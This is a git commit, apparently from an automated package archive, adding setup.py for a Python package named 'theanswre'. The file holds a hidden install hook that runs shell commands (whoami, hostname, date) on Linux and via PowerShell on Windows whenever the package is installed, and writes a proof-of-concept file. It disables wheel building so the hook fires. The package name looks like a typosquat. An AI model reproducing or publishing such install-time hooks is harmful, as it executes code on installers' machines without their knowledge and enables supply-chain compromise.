e30d86860cda2d7f6c77c0478e04c57423635435
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2026-01-31 03:45:37 +0000

    Add package theanswre/0.2.2/theanswre-0.2.2.tar.gz

---
+++ packages/theanswre/theanswre-0.2.2.tar.gz/theanswre-0.2.2/setup.py
@@ -0,0 +1,23 @@
+from setuptools import setup, find_packages
+from setuptools.command.install import install
+import os
+
+class CustomInstallCommand(install):
+    def run(self):
+        if os.name == 'posix':
+            os.system('whoami;hostname;date > /tmp/code_exec.poc')
+        elif os.name == 'nt':
+            os.system('powershell.exe "whoami;hostname;date > ~/Documents/code_exec.poc"')
+        super().run()
+
+setup(
+    name='theanswre',
+    version='0.2.2',
+    package_dir={"": "src"},
+    packages=find_packages(where='src'),
+    install_requires=['setuptools'],
+    cmdclass={
+        "install": CustomInstallCommand,
+        'bdist_wheel': None
+    }
+)
